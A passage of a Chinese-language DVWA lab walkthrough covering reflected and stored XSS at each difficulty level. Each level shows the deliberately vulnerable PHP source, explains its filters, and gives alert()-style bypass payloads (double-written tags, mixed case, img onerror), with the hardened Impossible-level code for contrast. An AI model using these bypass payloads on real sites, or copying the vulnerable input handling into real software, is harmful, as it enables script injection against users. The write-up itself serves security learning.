$_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">            header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS,全程Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，xss部基金限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型XSS。</p>
<p>DOM型XSS由于其特殊性，常常被分为第三种，其是一种基于DOM树的XSS。例如服务器端经常使用document.body.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型xss可能是存储型也可能是反射型</p>
<h2 id="XSS（Reflect）反射型XSS"><a href="#XSS（Reflect）反射型XSS" class="headerlink" title="XSS（Reflect）反射型XSS"></a>XSS（Reflect）反射型XSS</h2><h3 id="Low-8"><a href="#Low-8" class="headerlink" title="Low"></a>Low</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在源码中，代码是直接引用name参数，并没有任何的过滤和检查，存在明显的XSS漏洞。</p>
<p>漏洞利用</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">键入：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>     //成功弹框</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/69.png" alt></p>
<p>相应的XSS链接：<a href="http://172.18.9.91/DVWA-master/vulnerabilities/xss_r/?name=alert(%2Fxss%2F)<%2Fscript>#" target="_blank" rel="noopener">http://172.18.9.91/DVWA-master/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#</a></p>
<h3 id="Medium-8"><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在该级别中，对输入的参数进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<code>&lt;script&gt;</code>删除，这种防护机制绕过较为容易，进行双写就行。</p>
<p>漏洞利用</p>
<p>1.双写绕过</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="params">&lt;scr&lt;script&gt;</span>ipt&gt;alert(<span class="meta-keyword">/xss/</span>)<span class="params">&lt;/script&gt;</span>  <span class="comment">//成功弹框</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/70.png" alt></p>
<p>相应的XSS链接：<a href="http://172.18.9.91/DVWA-master/vulnerabilities/xss_r/?name=ipt>alert(%2Fxss%2F)<%2Fscript>#" target="_blank" rel="noopener">http://172.18.9.91/DVWA-master/vulnerabilities/xss_r/?name=%3Cscr%3Cscript%3Eipt%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#</a></p>
<p>2.大小写混淆绕过</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="tag">&lt;<span class="name">ScRipt</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   //成功弹框</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/71.png" alt></p>
<p>相应的XSS链接：<a href="http://172.18.9.91/DVWA-master/vulnerabilities/xss_r/?name=alert(%2Fxss%2F)<%2Fscript>#" target="_blank" rel="noopener">http://172.18.9.91/DVWA-master/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#</a></p>
<h3 id="High-8"><a href="#High-8" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到,high级别的代码同样使用黑名单过滤输入，preg_replace()函数用于正则表达式的搜索和替换，这就使双写和大小写混淆的方式不再有效。</p>
<p>漏洞利用</p>
<p>虽然无法使用<code>&lt;script&gt;</code>标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(/xss/)&gt; 成功弹框</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/72.png" alt></p>
<p>相应的XSS的链接：<a href="http://172.18.9.91/DVWA-master/vulnerabilities/xss_r/?name=#" target="_blank" rel="noopener">http://172.18.9.91/DVWA-master/vulnerabilities/xss_r/?name=%3Cimg+src%3D1+onerror%3Dalert%28%2Fxss%2F%29%3E#</a></p>
<h3 id="Impossible-8"><a href="#Impossible-8" class="headerlink" title="Impossible"></a>Impossible</h3><p>服务器端源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// Is there any input?</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// Check Anti-CSRF token</span></span></span><br><span class="line"><span class="php">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// Get input</span></span></span><br><span class="line"><span class="php">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// Feedback for end user</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// Generate Anti-CSRF token</span></span></span><br><span class="line"><span class="php">generateSessionToken();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>可以看到，Impossible级别的代码使用htmlspecialchars函数把预定义的字符<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、<code>&lt;</code>、<code>&gt;</code>转换为HTML实体，防止浏览器将其作为HTML元素。</p>
<h2 id="XSS（Stored）存储型XSS"><a href="#XSS（Stored）存储型XSS" class="headerlink" title="XSS（Stored）存储型XSS"></a>XSS（Stored）存储型XSS</h2><h3 id="Low-9"><a href="#Low-9" class="headerlink" title="Low"></a>Low</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>相关函数</p>
<p>trim(string,charlist)</p>
<p>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括<code>\t</code>、<code>\n</code>、<code>\x0B</code>、<code>\r</code>以及空格，可选参数charlist支持添加额外需要删除的字符。</p>
<p>mysql_real_escape_string(string,connection)</p>
<p>函数会对字符串中的特殊符号<code>\x00</code>,<code>\n</code>,<code>\r</code>,<code>\</code>,<code>&#39;</code>,<code>&quot;</code>,<code>\x1a</code>进行转义。</p>
<p>stripslashes(string)</p>
<p>函数删除字符串中的反斜杠。</p>
<p>可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此此处存在明显的存储型XSS漏洞</p>
<p>漏洞利用</p>
<p>message一栏输入</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  //成功弹框</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/73.png" alt></p>
<p>name一栏前端有字数的限制，抓包改为</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/name/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/74.png" alt></p>
<p>成功弹框</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/75.png" alt></p>
<p>由于页面是在前端进行限制name字数，所以可以在前端将name输入框的限制进行改变，就可以进行输入了</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/76.png" alt></p>
<p>成功弹框</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/77.png" alt></p>
<h3 id="Medium-9"><a href="#Medium-9" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>相关函数</p>
<p>strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签，但是允许使用<code>&lt;b&gt;</code>标签</p>
<p>addslashes()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</p>
<p>可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS。</p>
<p>漏洞利用</p>
<p>1.双写绕过</p>
<p>抓包改name参数或者前端更改name输入框长度限制后输入</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">ript&gt;alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>成功弹框</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/78.png" alt></p>
<p>2.大小写混淆绕过</p>
<p>抓包改name参数或者更改name输入框长度限制后输入：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/79.png" alt></p>
<h3 id="High-9"><a href="#High-9" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在后端源码中，使用正则表达式过滤了<code>&lt;script&gt;</code>标签，但是忽略了img、iframe等其他危险的标签，因此name参数依旧存在存储型XSS</p>
<p>漏洞利用</p>
<p>抓包改name参数或者前端更改name输入框输入限制长度后输入</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>成功弹框</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/80.png" alt></p>
<h3 id="Impossible-9"><a href="#Impossible-9" class="headerlink" title="Impossible"></a>Impossible</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = stripslashes( $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the 